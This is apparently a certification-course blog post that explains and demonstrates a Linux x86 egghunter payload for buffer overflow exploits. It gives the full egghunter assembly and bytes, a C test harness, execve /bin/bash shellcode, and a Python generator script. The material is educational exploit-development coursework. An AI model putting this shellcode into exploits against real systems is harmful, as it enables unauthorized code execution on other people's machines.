---
layout: post
title: Egghunter Demo
---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

*http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*

*Student ID: SLAE - 1187*

Introduction
============

Sometimes when developing a buffer overflow exploit we can find ourselves with extremely limited space for shellcode, but large swaths of space in the buffer we've exploited. Egghunter shellcodes are tiny payloads that search through the memory space of an exploited program, looking for a string of characters called an egg. When the egghunter finds this egg, it passes execution to the data immediately after the egg. This data is a larger, shall we say, more meaningful shellcode payload. 

The problem with searching through memory is something that should be familiar to us now after building and testing shellcode payloads. The dreaded segmentation fault, or segfault. A segfault occurs when a program attempts to access a memory region that has not been allocated by the operating system. Memory needs to be allocated by the operating system in order to be usable by programs. It is inevitable that when searching through memory like this we will run into some unallocated memory and segfault. The primary trick of the egghunter is to avoid this by using some external means, almost exclusively a system call, that will verify for it if a piece of memory is accessible before it attempts to read from the memory and check for the egg. 


We'll start, as all Linux egghunter discussions do, by mentioning [Skape's paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf). Skape describes several small egghunters and the mechanics behind them. Skape's paper is the primary source for what I'm presenting here today, and I want to make sure credit is given where it is due!

Demonstration
=============

First I use my wrapper to generate an egghunter payload. 

```
root@mountain:~#  python3 egghunter_generator.py \x77\x30\x30\x74
Your egg is: \x77\x30\x30\x74
Your egghunter's length is 37
Your egghunter is:
\x31\xC9\xF7\xE1\x66\x81\xCA\xFF\x0F\x42\x8D\x5A\x04\x6A\x21\x58\xCD\x80\x3C\xF2\x74\xEE\xB8\x74\x30\x30\x77\x89\xD7\xAF\x75\xE9\xAF\x75\xE6\xFF\xE7
Please prepend your second stage shellcode with the following bytes: \x74\x30\x30\x77\x74\x30\x30\x77
```

I then insert the egghunter payload, the egg, and the shellcode I want to run into my C demo file. This file has the shellcode with egg *somewhere* in memory. It executes the egghunter which should find it. 

## C Demo File
```C
//Egghunter Demo File
#include <stdio.h>
#include <string.h>

#define EGG "\x44\x43\x42\x41"

unsigned char egghunter[] = \
"\x31\xC9\xF7\xE1\x66\x81\xCA\xFF\x0F\x42\x8D\x5A\x04\x6A\x21\x58\xCD\x80\x3C\xF2\x74\xEE\xB8\x44\x43\x42\x41\x89\xD7\xAF\x75\xE9\xAF\x75\xE6\xFF\xE7";

unsigned char shellcode[] = \
EGG
EGG
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void) {
    printf("Shellcode length: %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())egghunter;

    ret();
}
```

It shouldn't matter how we get the `\x74\x30\x30\x77\x74\x30\x30\x77` prepended to our shellcode, as long as it's there. It is the egg repeated twice. 

The shellcode I use is a simple execve payload. The source of which can be found below:

```nasm
global _start

section .text

_start:
    XOR EAX, EAX
    PUSH EAX
    
    PUSH 0x68736162
    PUSH 0x2f6e6962
    PUSH 0x2f2f2f2f ; Stack contents: ////bin/bash\x00\x00\x00\x00

    MOV EBX, ESP    ; ESP now contains a pointer to the start of ////bin/bash...

    PUSH EAX        ; We need another NUL for ENVP's array
    MOV EDX, ESP    ; EDX now contains a pointer to the last NUL pushed

    PUSH EBX        ; argv, array of pointers starting with pointer to ////bin/bash
    MOV ECX, ESP    ; move pointer to this array to ECX
    
    MOV AL, 0x0B

    INT 0x80

```

After compiling and running the demo file using the normal gcc flags mentioned in my bind shell payload article, we run it and are met with our shell as intended. We can see this by echoing `$0`, a special variable that indicates our shell. The execve payload we used pads the path of bash with extra slashes. We can see this in our current shell.

```
root@mountain:~# ./egghunter_demo.elf 
Shellcode length: 38
root@mountain:/root#
root@mountain:/root# echo $0
////bin/bash
```

Implementation
==============

We'll be implementing an `access(2)` egghunter. `access(2)` is a syscall that takes a pointer to a string that represents a filename, and and the permissions we are checking for. We will set the permission mask to zero and set the string argument to the memory we want to validate. There are other syscalls we could use, but `access(2)` is chosen specifically because it only requires us to put a pointer to the memory we wish to check into one register, and it does not attempt to write anything anywhere, which could cause unintended problems down the line. The syscall will return `0xFFFFFFF2` for an `EFAULT` which indicates to us that the memory is not accessible.

Let's get right into the code.

```nasm
xor ecx, ecx
mul ecx     
```

First some standard setup. We need ECX and EDX nulled, and we null EAX too just for good measure. The addition is essentially free through the MUL instruction.

```nasm
page_alignment:
or dx, 0xfff       
```
 
This code sets the memory address in EDX to be one byte before the start of the next page. The next instruction after this will be an INC EDX to finish the alignment. This code skips checking the page `0x00000000` and starts at `0x00001000`. We JMP back here when `access(2)` returns EFAULT to move up to the next page. 

```nasm
inc_memory_addr:     
inc edx              
lea ebx, [edx + 0x04]
push byte 0x21       
pop eax
int 0x80             
```

We jump back to this point if the memory is reported as being valid by `access(2)`. You see the INC EDX instruction I mentioned earlier, this moves up EDX to the next address if the memory was valid and finishes page alignment if the memory was invalid. Then EBX is loaded with EBX + 4. This allows us to validate larger swathes of memory at once. Instead of four bytes at a time we can validate 8. Because we increment by PAGE_SIZE (0x00001000) if access fails, we can safely assume that if EDX + 4 is valid, EDX must also be valid. Then we use the PUSH/POP method to get 0x21 into EAX and fire the `access(2)` syscall. 

```nasm
cmp al, 0xf2     
jz page_alignment
```
 
Now we check what `access(2)` returns, if it's `0xFFFFFFF2`, indicating invalid memory, we JMP back up to the page_alignment label and move up a page. This is not the most robust check, if we were to not clear ECX we may get back `EINVAL`, or `0xFFFFFFEA`. If this is the case our egghunter will break and likely segmentation fault as all memory addresses would be considered valid.

```nasm
mov eax, 0x77303074
mov edi, edx
scasd
jnz inc_memory_addr       
``` 
 
Now if the memory is valid we begin checking for an egg. First we load the egg into EAX and we move the memory address we're checking into EDI. Then use a SCASD instruction to compare the strings. SCASD will return 0 if the strings are the same and it will also always increment EDI. If the egg is not found at this location, we JMP back to the `inc_memory_addr` label and try the next address. 

```nasm
scasd              
jnz inc_memory_addr
jmp edi            
```

If the egg is found, we SCASD again to make sure the egg is present twice and make the same JMP if it is not. EDI is incremented automatically again, and if we've found our egg we pass execution to EDI. 

Conclusion
==========

This egghunter is simple and relatively robust. It does not rely on any specific payload length or features, it will reliably find the egg in memory and pass execution to whatever resides in memory after it. I've also included in these sources an egghunter generator script that will produce an egghunter for a given user-provided egg. It takes four hex escaped bytes and uses it for its egg. For example, '\x41\x42\x43\x44'. You'll need to insert the egghunter and egg into your own shellcode/exploit. 
 
Sources
======= 

## Full Egghunter Source

The full source can also be found on my github [here.](https://github.com/fbcsec/slae-assignments/blob/master/3-egghunter/egghunter.asm). 

```nasm
global _start

section .text

_start:

xor ecx, ecx            ; null ecx
mul ecx                 ; null eax and edx

page_alignment:
or dx, 0xfff            ; page alignment so egghunter moves up in PAGE_SIZE increments.
                        ; A JMP taken to here moves up a page and checks if it's initialized.

inc_memory_addr:        ; a JMP taken here means the memory is valid and we are now searching for the egg
inc edx                 ; EDX holds the current memory address we are inspecting, it is incremented to a new memory location
lea ebx, [edx + 0x04]   ; load the address to be validated into EBX
push byte 0x21          ; PUSH POP access(2) syscall ID into EAX
pop eax
int 0x80                ; fire syscall to attempt memory validation

cmp al, 0xf2            ; Has AL returned 0xffffffff2 (-2)?
jz page_alignment       ; If so JMP to the start of the egghunt loop and move up a page
mov eax, 0x77303074     ; If not, Move egg into EAX, in this case it's 'w00t'
mov edi, edx            ; Move EDX into EDI
scasd                   ; Compare data at memory pointed to by EDX and EDI with EAX
jnz inc_memory_addr     ; If it does not match the egg, JMP to the inc EDX instruction in the egghunt loop (skipping the page realignment) and try again.
scasd                   ; Do the above again (the egg needs to appear twice)
jnz inc_memory_addr     ; Note that EDI is incremented by SCASD.
jmp edi                 ; If the egg appears twice in a row, pass execution to it.

```

## Full Egghunter Generator Source

As usual, this source can also be found on github [here.](https://github.com/fbcsec/slae-assignments/blob/master/3-egghunter/egghunter_generator.py) 

```python
#!/usr/bin/env python3
"""
x86 Egghunter Generator
Usage: this_script.py <four_byte_hex_escaped_egg_of_choice>
Author: @fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""

import sys


def array_hex_str_to_ints(list_of_hex_strings):
    """This function accepts a list of strings containing hex digits and
    converts each item into bytes.
    For example, [21, 41, 42, 43] is converted into [b'!', b'A', b'B', b'C']
    """

    for item in range(0, len(list_of_hex_strings)):
        list_of_hex_strings[item] = int(list_of_hex_strings[item], 16)

    return list_of_hex_strings


def process_shellcode(shellcode_input):
    """Convert a string of hex values formatted as C-style hex escapes
    into an array of integers.
    Returns bytes"""

    split_shellcode = shellcode_input.split("x")
    split_shellcode = split_shellcode[1::]  # Remove bogus empty string at start of array

    processed_shellcode = bytes(array_hex_str_to_ints(split_shellcode))

    return processed_shellcode


def c_format_binary_data(data):
    hex_escaped = ''
    for byte in data:
        formatted_byte = '\\x{0:0{1}X}'.format(byte, 2)
        hex_escaped += formatted_byte
    return hex_escaped


def main():
    if len(sys.argv) != 2:
        print('Usage: %s <four_byte_hex_escaped_egg_of_choice>' % sys.argv[0])
        print('Egg must be four bytes, formatted like so: \\x41\\x42\\x43\\x44')
        raise SystemExit

    egg = process_shellcode(sys.argv[1])
    if len(egg) != 4:
        print('Egg must be four bytes, formatted like so: \\x41\\x42\\x43\\x44')
        raise SystemExit


    egg = bytearray(egg)

    real_egg = egg[::-1] + egg[::-1]

    EGGHUNTER = (bytearray("\x31\xc9"  # xor ecx, ecx
                           "\xf7\xe1"  # mul ecx
                           "\x66\x81\xca\xff\x0f"  # <egghunt_loop_start:> or dx, 0xfff
                           "\x42"  # <scasd_zero:> inc edx
                           "\x8d\x5a\x04"  # lea ebx, [edx+0x4]
                           "\x6a\x21"  # push 0x21
                           "\x58"  # pop eax
                           "\xcd\x80"  # int 0x80
                           "\x3c\xf2"  # cmp al, 0xf2
                           "\x74\xee"  # je egghunt_loop_start
                           "\xb8", "iso-8859-1") + egg[::-1] +  # mov eax, <egg>
                 bytearray("\x89\xd7"  # mov mov edi, edx
                           "\xaf"  # scasd eax
                           "\x75\xe9"  # jne scasd_zero 
                           "\xaf"  # scasd eax
                           "\x75\xe6"  # jne scasd_zero
                           "\xff\xe7",  # jmp edi
                           "iso-8859-1"
                           ))
    print("Your egg is: %s" % c_format_binary_data(egg))
    print("Your egghunter's length is %d" % len(EGGHUNTER))
    print("Your egghunter is:\n%s" % c_format_binary_data(EGGHUNTER))
    print("Please prepend your second stage shellcode with the following bytes: %s" %
          c_format_binary_data(real_egg))

if __name__ == '__main__':
    main()
```